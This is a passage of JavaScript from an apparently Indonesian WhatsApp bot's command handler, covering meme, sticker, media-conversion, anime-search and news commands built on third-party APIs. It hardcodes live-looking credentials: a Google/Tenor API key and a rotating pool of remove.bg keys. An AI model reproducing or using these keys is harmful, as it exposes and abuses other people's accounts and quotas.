                    image: { url: `https://api.lolhuman.xyz/api/meme/darkjoke?apikey=${global.apilol}` },
                    caption: `*〔 Random Image Dark Joke 〕*`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
          break
case '12345meme1': case '12345meme4': case '12345meme5':{          
             if (!text) throw `*Masukan teks*\n _Contoh:_ ${prefix + command} Tahu bacem enak lhoo, jangan lupakan ini `             
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/${command}?apikey=${global.apilol}&text=${text}` }, caption: `Meme maker ${command}` }, { quoted: m })
            }
          break
case '12345meme2': case '12345meme7': case '12345meme8': {        
             if (!text) throw `*Masukan teks1+teks2*\n _Contoh:_ ${prefix + command} Jumatan bisa+Jumatan dapet nasi kotak`
              tas = arg.split('+')[0]
              wah = arg.split('+')[1]
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/${command}?apikey=${global.apilol}&text1=${tas}&text2=${wah}` }, caption: `Meme maker ${command}` }, { quoted: m })
            }
          break
case '12345meme3': {          
             if (!text) throw `*Masukan teks1+teks2+teks3*\n _Contoh:_ ${prefix + command} Aku lewat jalan ramai+Aku lewat jalan sepi+Aku lewat kuburan`
              tas = arg.split('+')[0]
              wah = arg.split('+')[1]
              tri = arg.split('+')[2]
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/meme3?apikey=${global.apilol}&text1=${tas}&text2=${wah}&text3=${tri}` }, caption: `Meme maker ${command}` }, { quoted: m })
            }
          break
case '12345meme6': {          
             if (!text) throw `*Masukan teks1+teks2+teks3*\n _Contoh:_ ${prefix + command} Tadi mau ngapain+gk tau mo tidur+lu kan belom sholat Isya`
              tas = arg.split('+')[0]
              wah = arg.split('+')[1]
              tri = arg.split('+')[2]
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/meme3?apikey=${global.apilol}&text1=${tas}&text2=${wah}&text3=${tri}` }, caption: `Meme maker 3` }, { quoted: m })
            }
          break
case '12345kanna': {          
             if (!text) throw `*Masukan teks*\n _Contoh:_ ${prefix + command} Tahu bacem enak lhoo, jangan lupakan ini `             
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/creator/kannagen?apikey=${global.apilol}&text=${text}` }, caption: `Meme maker ${command}` }, { quoted: m })
            }
          break
case '12345mind': {          
             if (!text) throw `*Masukan teks*\n _Contoh:_ ${prefix + command} Sembako isinya sampah `             
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/creator/changemymind?apikey=${global.apilol}&text=${text}` }, caption: `Meme maker change my mind` }, { quoted: m })
            }
          break
case '12345ohno': {          
             if (!text) throw `*Masukan teks*\n _Contoh:_ ${prefix + command} Sembako isinya sampah `             
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/creator/changemymind?apikey=${global.apilol}&text=${text}` }, caption: `Meme maker oh no` }, { quoted: m })
            }
          break
case '12345smeme': {
	if (!text) throw `*Send/Reply Image dengan Caption ${prefix + command} teks1+teks2*\n_Contoh:_ ${prefix + command} Lihat itu+ada wibu berkeliaran`
	if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command} ${text}`
	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await Pajrin.downloadAndSaveMediaMessage(quoted)
	let anu = await TelegraPh(media)
	tas = arg.split('+')[0]
              wah = arg.split('+')[1]
                    //uri = api('zenz',`/memegen?apikey=${global.apilol}&texttop=${tas}&textbottom=${wah}&img=${anu}
                Pajrin.sendMessage(m.chat, { image: { url: api('zenz',`/memegen?apikey=${global.apilol}&texttop=${tas}&textbottom=${wah}&img=${anu}`) }, caption: `*Reply dengan caption*\n${prefix}s\n*Untuk menjadikan sticker*` }, { quoted: m })      
               //   Pajrin.sendMessage(m.chat, { sticker: { url: api('zenz',`/memegen?apikey=${global.apilol}&texttop=${tas}&textbottom=${wah}&img=${anu}`) },caption: ` ${command} ${text}` }, { quoted: m })
  }
                           break
case '12345memecreator': {
	if (!text) throw `*Send/Reply Image dengan Caption ${prefix + command} teks1+teks2*\n_Contoh:_ ${prefix + command} Lihat itu+ada wibu berkeliaran`
	if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command} ${text}`
	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await Pajrin.downloadAndSaveMediaMessage(quoted)
	let anu = await TelegraPh(media)
	tas = arg.split('+')[0]
              wah = arg.split('+')[1]
                    //uri = api('zenz',`/memegen?apikey=${global.apilol}&texttop=${tas}&textbottom=${wah}&img=${anu}
                Pajrin.sendMessage(m.chat, { image: { url: api('zenz',`/memecreator?apikey=${global.apilol}&text1=${tas}&text2=${wah}&img=${anu}`) }, caption: `*Reply dengan caption*\n${prefix}s\n*Untuk menjadikan sticker*` }, { quoted: m })      
               //   Pajrin.sendMessage(m.chat, { sticker: { url: api('zenz',`/memegen?apikey=${global.apilol}&texttop=${tas}&textbottom=${wah}&img=${anu}`) },caption: ` ${command} ${text}` }, { quoted: m })
  }
                           break
//[STICKER MENU]\\ With apikey lol human
            case '12345sticker': case '12345s': case '12345stickergif': case '12345sgif': {  
            replay(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await Pajrin.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 seconds!')
                let media = await quoted.download()
                let encmedia = await Pajrin.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                throw `Send/reply Image/Video dengan Caption ${prefix + command}\nVideo Durasi 1-9 detik`
                }
            }
            break
case '12345harta': {
	if (!text) throw `*Masukan Teks !*\n_Contoh:_ ${prefix + command} xZrinva`
	m.reply(mess.wait)
		let anu = `https://api.lolhuman.xyz/api/hartatahta?apikey=${global.apilol}&text=${text}`
		Pajrin.sendMessage(m.chat, { image: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
		let media = anu
                let encmedia = await Pajrin.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            }
break           
case '12345hartacustom': {
	if (!text) throw `*Masukan Teks !*\n_Contoh:_ ${prefix + command} Fazrin
Ganteng
Banget
GK BOHONG !`
	m.reply(mess.wait)
		let anu = `https://api.lolhuman.xyz/api/hartacustom?apikey=${global.apilol}&text=${text}`
		Pajrin.sendMessage(m.chat, { image: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
		let media = anu
                let encmedia = await Pajrin.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            }
break           
case '12345patrick': {
		let anu = `https://api.lolhuman.xyz/api/sticker/patrick?apikey=${global.apilol}`
		    Pajrin.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
break           
case '12345samongus':{
              let anu = `https://api.lolhuman.xyz/api/sticker/amongus?apikey=${global.apilol}`
              Pajrin.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
  break       
  case '12345gawrgura':{
              let anu = `https://api.lolhuman.xyz/api/sticker/gawrgura?apikey=${global.apilol}`
              Pajrin.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
  break       
  case '12345bucinstick':{
              let anu = `https://api.lolhuman.xyz/api/sticker/bucinstick?apikey=${global.apilol}`
              Pajrin.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
  break       
case '12345attp':{
	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
              let anu = `https://api.lolhuman.xyz/api/attp?apikey=${global.apilol}&text=${text}`
              Pajrin.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
  break
case '12345attp2':{
	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
              let anu = `https://api.lolhuman.xyz/api/attp2?apikey=${global.apilol}&text=${text}`
              Pajrin.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
  break
case '12345ttp':{
	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
              let anu = `https://api.lolhuman.xyz/api/ttp?apikey=${global.apilol}&text=${text}`
              Pajrin.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
            break
case '12345ttp2':{
	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
              let anu = `https://api.lolhuman.xyz/api/ttp2?apikey=${global.apilol}&text=${text}`
              Pajrin.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
            break
case '12345ttp3':{
	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
              let anu = `https://api.lolhuman.xyz/api/ttp3?apikey=${global.apilol}&text=${text}`
              Pajrin.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
            break
case '12345ttp4':{
	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
              let anu = `https://api.lolhuman.xyz/api/ttp4?apikey=${global.apilol}&text=${text}`
              Pajrin.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
            break
case '12345ttp5':{
	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
              let anu = `https://api.lolhuman.xyz/api/ttp5?apikey=${global.apilol}&text=${text}`
              Pajrin.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
            break
case '12345ttp6':{
	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
              let anu = `https://api.lolhuman.xyz/api/ttp6?apikey=${global.apilol}&text=${text}`
              Pajrin.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
            break
//[convert MENU]\\ With apikey lol human
case '12345topdf': {
	if (!text) throw `*Kirim/reply Gambar dengan Caption*  ${prefix + command} judul pdf\n\n_Contoh:_ ${prefix + command} Tugas Biologi`
    m.reply(mess.wait)
 //  https://api.lolhuman.xyz/api/convert2pdf?apikey=fleyvin_soft&filename=LoLHuman.jpg&file=https://i.postimg.cc/CM34YRFb/photo-2021-02-05-10-13-39.jpg
       let { UploadFileUgu, webp2mp4File, TelegraPh  } = require('./lib/uploader')
                let media = await Pajrin.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                  //  let ana = await fetchJson(api('zenz', `/convert2pdf?apikey=${global.apilol}&filename=${text}&file=${anu}`))               
                  let ana = await fetchJson(api('zenz',`/convert2pdf?apikey=${global.apilol}&filename=LoLHuman.jpg&file=${anu}`))               
                    Pajrin.sendMessage(m.chat, {document: {url: ana.result }, mimetype: 'application/pdf', fileName: `${text}`}, {quoted:m})
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    let ana = await fetchJson(api('zenz',`/convert2pdf?apikey=${global.apilol}&filename=LoLHuman.jpg&file=${anu.url}`))               
                    Pajrin.sendMessage(m.chat, {document: {url: ana.result }, mimetype: 'application/pdf', fileName: `${text}`}, {quoted:m})
                   //replay(anu.url)
// reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break

 case '12345tohex': {
        	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Aku suka sama kamu`
        	let anu = await fetchJson(`https://api.lolhuman.xyz/api/convert/strtohex?apikey=${global.apilol}&text=${text}`)
reply(anu.result)
}
break
case '12345dhex': {
        	if (!text) throw `*Masukan kode hex*\n_Contoh:_ ${prefix + command} 7375627320797420785a72696e7661`
        	let anu = await fetchJson(`https://api.lolhuman.xyz/api/convert/hextostr?apikey=${global.apilol}&hex=${text}`)
reply(anu.result)
}
break
case '12345tomorse': {
        	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Aku suka sama kamu`
        	let anu = await fetchJson(`https://api.lolhuman.xyz/api/morse/encrypt?apikey=${global.apilol}&text=${text}`)
reply(anu.result)
}
break
case '12345dmorse': {
        	if (!text) throw `*Masukan kode morse*\n_Contoh:_ ${prefix + command} -..- --.. .-. .. -. ...- .- `
        	let anu = await fetchJson(`https://api.lolhuman.xyz/api/morse/decrypt?apikey=${global.apilol}&text=${text}`)
reply(anu.result)
}
break
    case '12345tobinary': {
            if (!m.quoted) throw `Reply pesan teks dengan caption ${prefix + command}`
            let { eBinary } = require('./lib/binary')
            let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
            let eb = await eBinary(teks)
            m.reply(eb)
        }
        break
            case '12345dbinary': {
            if (!m.quoted) throw `Reply pesan teks binary dengan caption ${prefix + command}`
            let { dBinary } = require('./lib/binary')
            let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
            let db = await dBinary(teks)
            m.reply(db)
        }
        break
            case '12345emojimix': {
	        if (!text) throw `*Masukan emoji1+emoji2*\n_Contoh:_ ${prefix + command} ❤️+😁`
		let [emoji1, emoji2] = text.split`+`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await Pajrin.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
         case '12345tofoto': case '12345toimage': case '12345toimg': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `*balas stiker dengan caption*  ${prefix + command}`
                replay(mess.wait)
                let media = await Pajrin.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    Pajrin.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
	        case '12345tomp4': case '12345tovideo': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `*balas stiker dengan caption*  ${prefix + command}`
                replay(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await Pajrin.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await Pajrin.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case '12345toaud': case '12345toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Send/Reply Video dengan Caption ${prefix + command}`
            if (!quoted) throw `Send/Reply Video dengan Caption ${prefix + command}`
            replay(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            Pajrin.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case '12345tomp3': {
            if (/document/.test(mime)) throw `Send/Reply Video/Audio untuk convert ke MP3 , dengan Caption ${prefix + command}`
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Send/Reply Video/Audio untuk convert ke MP3 , dengan Caption ${prefix + command}`
            if (!quoted) throw `Send/Reply Video/Audio untuk convert ke MP3 , dengan Caption ${prefix + command}`
            replay(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            Pajrin.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Converted By ${ `${global.botnma}`}.mp3`}, { quoted : m })
            }
            break
            case '12345tovn': case '12345toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio dengan Caption*  ${prefix + command}`
            if (!quoted) throw `*Reply Video/Audio dengan Caption*  ${prefix + command}`
            replay(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            Pajrin.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case '12345togif': {
                if (!quoted) throw 'Reply Sticker'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                replay(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await Pajrin.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await Pajrin.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
                //reply(webpToMp4.result)
            }
            break
	        case '12345tourl': {
		//if (!quoted) throw 'Send/Reply Foto/Video/Audio/file dengan Caption ${prefix + command}'
                replay(mess.wait)
		let { UploadFileUgu, webp2mp4File, TelegraPh  } = require('./lib/uploader')
                let media = await Pajrin.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                 reply(anu.url)
                }
                await fs.unlinkSync(media)
            }
            break
            case '12345imagenobg': case '12345removebg': case '12345remove-bg': {
	    if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command}`
	    if (!/image/.test(mime)) throw `Send/Reply Image dengan Caption ${prefix + command}`
	    if (/webp/.test(mime)) throw `Send/Reply Image dengan Caption ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await Pajrin.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    replay(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    Pajrin.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
//[ANIME MANGA MENU]\\ With apikey lol human
case '12345animes': case '12345animesearch': {
	if (!text) throw `*Apa yang di cari?*\n_Contoh:_ ${prefix + command} naruto`
	let anu = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=${global.apilol}&query=${text}`)
	Pajrin.sendMessage(m.chat, { image: { url: anu.result.coverImage.large }, caption: `*〔 Anime Search 〕*

*⭔ Title :*
  Romaji : *${anu.result.title.romaji}*
  English : *${anu.result.title.english}*
  Native : *${anu.result.title.native}*
*⭔ Format :* ${anu.result.format}
*⭔ Episodes :* ${anu.result.episodes}
*⭔ Duration :* ${anu.result.duration}
*⭔ Status :* ${anu.result.status}
*⭔ Season :* ${anu.result.season}
*⭔ Season Year :* ${anu.result.seasonYear}
*⭔ Start Date :* ${anu.result.startDate.year} ${anu.result.startDate.month} ${anu.result.startDate.day}
*⭔ End Date :* ${anu.result.endDate.year} ${anu.result.endDate.month} ${anu.result.endDate.day}
*⭔ Source :* ${anu.result.source}
*⭔ Description :* ${anu.result.description}` }, { quoted: m })      
}
break
case '12345mangas': case '12345mangasearch': {
	if (!text) throw `*Apa yang di cari?*\n_Contoh:_ ${prefix + command} gotoubun no hanayome`
	let anu = await fetchJson(`https://api.lolhuman.xyz/api/manga?apikey=${global.apilol}&query=${text}`)
	Pajrin.sendMessage(m.chat, { image: { url: anu.result.coverImage.large }, caption: `*〔 Manga Search 〕*

*⭔ Title :*
  Romaji : *${anu.result.title.romaji}*
  English : *${anu.result.title.english}*
  Native : *${anu.result.title.native}*
*⭔ Format :* ${anu.result.format}
*⭔ Chapters :* ${anu.result.chapters}
*⭔ Volumes :* ${anu.result.volumes}
*⭔ Status :* ${anu.result.status}
*⭔ Source :* ${anu.result.source}
*⭔ Start Date :* ${anu.result.startDate.year} ${anu.result.startDate.month} ${anu.result.startDate.day}
*⭔ End Date :* ${anu.result.endDate.year} ${anu.result.endDate.month} ${anu.result.endDate.day}
*⭔ Description :* ${anu.result.description}` }, { quoted: m })      
}
break
case '12345character': case '12345karakteranime': {
	if (!text) throw `*Apa yang di cari?*\n_Contoh:_ ${prefix + command} miku nakano`
	let anu = await fetchJson(`https://api.lolhuman.xyz/api/character?apikey=${global.apilol}&query=${text}`)
	Pajrin.sendMessage(m.chat, { image: { url: anu.result.image.large }, caption: `*〔 Character Search 〕*

*⭔ Nama :*
  Full : *${anu.result.name.full}*
  Native : *${anu.result.name.native}*
*⭔ Favourites :* ${anu.result.favourites}
*⭔ Description :* ${anu.result.description}` }, { quoted: m })      
}
break
case '12345animestory': case '12345storyanime': {                  
                let anu = await fetchJson(`https://api.lolhuman.xyz/api/storynime?apikey=${global.apilol}`)               
              media = await getBuffer(anu.result)
  let buttons = [
                    {buttonId: `${prefix + command}`, buttonText: {displayText: `➡️'NEXT➡️` }, type: 1}
                ]
                let buttonMessage = {
                    video: media,
                    caption: `*〔 Random Story Anime 〕*`,
                    footer: 'Klik Tombol di Bawah',
                    buttons: buttons,
                    headerType: 5
                }
               Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })       
            }
          break
          case '12345neonime': {
          let anu = await fetchJson(`https://api.lolhuman.xyz/api/neonimelatest?apikey=${global.apilol}`)  
          let ini = anu.result
          let result = ini[Math.floor(Math.random() * ini.length)]
          //points.sort(function(a, b){return a - b});
  let buttons = [
                    {buttonId: `${prefix + command}`, buttonText: {displayText: `➡️'NEXT➡️` }, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.thumbnail },
                    caption: `*〔 Neonime Latest 〕*

*⭔ Title :* ${result.title}
*⭔ Episode :* ${result.episode}
*⭔ Date :* ${result.date}
*⭔ Link :* ${result.link}
*⭔ Deskripsi :* ${result.desc}`,
                    footer: 'Klik Tombol NEXT untuk hasil lainya',
                    buttons: buttons,
                    headerType: 5
                }
               Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })       
            }
break
case '12345kusonimesearch': case '12345kusonimes': {
	if (!text) throw `*Apa yang di cari?*\n_Contoh:_ ${prefix + command} boruto`
          let anu = await fetchJson(`https://api.lolhuman.xyz/api/kusonimesearch2?apikey=${global.apilol}&query=${text}`)  
          let ini = anu.result
          let result = ini[Math.floor(Math.random() * ini.length)]
  let buttons = [
                    {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: `➡️'NEXT➡️` }, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.thumbnail },
                    caption: `*〔 Kusonime Search 〕*

*⭔ Title :* ${result.title}
*⭔ Link :* ${result.link}`,
                    footer: 'Klik Tombol NEXT untuk hasil lainya',
                    buttons: buttons,
                    headerType: 5
                }
               Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })       
            }
break
//PHOTO EDITOR MENU]\\ With apikey lol human
case '12345wasted': case '12345pencil': case '12345triggered': case '12345fisheye': case '12345skullmask': case '12345cartoon': case '12345invert': case '12345pixelate': case '12345flip': case '12345grayscale': case '12345roundimage': {
	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await Pajrin.downloadAndSaveMediaMessage(quoted)
	let anu = await TelegraPh(media)
	
                    //https://api.lolhuman.xyz/api/editor/wasted?apikey=fleyvin_soft&img=https://i.postimg.cc/CM34YRFb/photo-2021-02-05-10-13-39.jpg
                Pajrin.sendMessage(m.chat, { image: { url: api('zenz',`/editor/${command}?apikey=${global.apilol}&img=${anu}`) }, caption: `*Photo Editor ${command}*\nBy ${global.botnma}` }, { quoted: m })      
                    }
break
case '12345affect': case '12345beautiful': case '12345facepalm': case '12345hitler': case '12345jail': case '12345jokeoverhead': case '12345rainbow': case '12345sepia': case '12345trash': case '12345wanted': {
	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await Pajrin.downloadAndSaveMediaMessage(quoted)
	let anu = await TelegraPh(media)
	
                  //  https://api.lolhuman.xyz/api/creator1/affect?apikey=fleyvin_soft&img=https://i.postimg.cc/CM34YRFb/photo-2021-02-05-10-13-39.jpg
                Pajrin.sendMessage(m.chat, { image: { url: api('zenz',`/creator1/${command}?apikey=${global.apilol}&img=${anu}`) }, caption: `*Photo Editor ${command}*\nBy ${global.botnma}` }, { quoted: m })      
                    }
break
case '123451977': case '12345aden': case '12345brannan': case '12345brooklyn': case '12345gingham': case '12345hudson': case '12345inkwell': case '12345earlybird': case '12345kelvin': case '12345larlk': case '12345lofi': case '12345maven': case '12345mayfair': case '12345moon': case '12345perpetua': case '12345nashville': case '12345reyes': case '12345rise': case '12345slumber': case '12345stinson': case '12345toaster': case '12345valencia': case '12345walden': case '12345willow': case '12345gingham': case '12345xpro2': {
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await Pajrin.downloadAndSaveMediaMessage(quoted)
	let anu = await TelegraPh(media)
                  //  https://api.lolhuman.xyz/api/filter/1977?apikey=fleyvin_soft&img=https://i.postimg.cc/CM34YRFb/photo-2021-02-05-10-13-39.jpg
                Pajrin.sendMessage(m.chat, { image: { url: api('zenz',`/filter/${command}?apikey=${global.apilol}&img=${anu}`) }, caption: `*Photo Editor ${command}*\nBy ${global.botnma}` }, { quoted: m })      
                    }
break

//[News berita MENU]\\ With apikey lol human
case '12345hoax': {
          let anu = await fetchJson(`https://api.lolhuman.xyz/api/turnbackhoax?apikey=${global.apilol}`)  
          let ini = anu.result
          let result = ini[Math.floor(Math.random() * ini.length)]   
  let btn = [{
                                urlButton: {
                                    displayText: 'LINK BERITA',
                                    url: `${result.link}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: `➡️'NEXT➡️`,
                                    id: `${prefix + command}`
                                }
                            }]
                      fatihgans = await getBuffer(result.thumbnail)
                      let txt = `*〔 NEWS From turnbackhoax.id 〕*

*⭔ Title :* ${result.title}
*⭔ Publish :* ${result.posted}
*⭔ Deskripsi :* ${result.desc}`

                      Pajrin.send5ButImg(m.chat, txt, `Klik NEXT untuk hasil lainnya`, fatihgans, btn)
            }
break
case '12345kumparan': case '12345republika': case '12345liputan6': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/${command}?apikey=${global.apilol}`)
 ini = anu.result
 let result = ini[Math.floor(Math.random() * ini.length)]
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: `*〔 NEWS From ${command} 〕*

*⭔ Title :* ${result.title}
*⭔ Deskripsi :* ${result.desc}
*⭔ Kategori :* ${result.category}
*⭔ Publish :* ${result.publish}
*⭔ Link :* ${result.link}`,
                    footer: `Klik NEXT untuk hasil lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '12345newsinfo': {
          let anu = await fetchJson(`https://api.lolhuman.xyz/api/newsinfo?apikey=${global.apilol}`)  
          let ini = anu.result
          let result = ini[Math.floor(Math.random() * ini.length)]   
  let btn = [{
                                urlButton: {
                                    displayText: 'LINK BERITA',
                                    url: `${result.url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: `➡️'NEXT➡️`,
                                    id: `${prefix + command}`
                                }
                            }]
                      fatihgans = await getBuffer(result.urlToImage)
                      let txt = `*〔 NEWS From ${result.source.name} 〕*

*⭔ Title :* ${result.title}
*⭔ Deskripsi :* ${result.description}
*⭔ Publish :* ${result.publishedAt}
*⭔ Konten :* ${result.content}`
                      Pajrin.send5ButImg(m.chat, txt, `By ${result.author}`, fatihgans, btn)
            }
break
case '12345detiknews': {
          let anu = await fetchJson(`https://api.lolhuman.xyz/api/detik?apikey=${global.apilol}`)  
          let ini = anu.result
          let result = ini[Math.floor(Math.random() * ini.length)]   
  let btn = [{
                                urlButton: {
                                    displayText: 'LINK BERITA',
                                    url: `${result.link}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: `➡️'NEXT➡️`,
                                    id: `${prefix + command}`
                                }
                            }]
                      fatihgans = await getBuffer(result.thumbnail)
                      let txt = `*〔 NEWS From detik.com 〕*

*⭔ Title :* ${result.title}
*⭔ Publish :* ${result.time}`
                      Pajrin.send5ButImg(m.chat, txt, `${global.fake}`, fatihgans, btn)
            }
break
case '12345jalantikus': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/${command}?apikey=${global.apilol}`)
 ini = anu.result
 let result = ini[Math.floor(Math.random() * ini.length)]
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: `*〔 NEWS From jalantikus.com 〕*

*⭔ Title :* ${result.title}
*⭔ Kategori :* ${result.category}
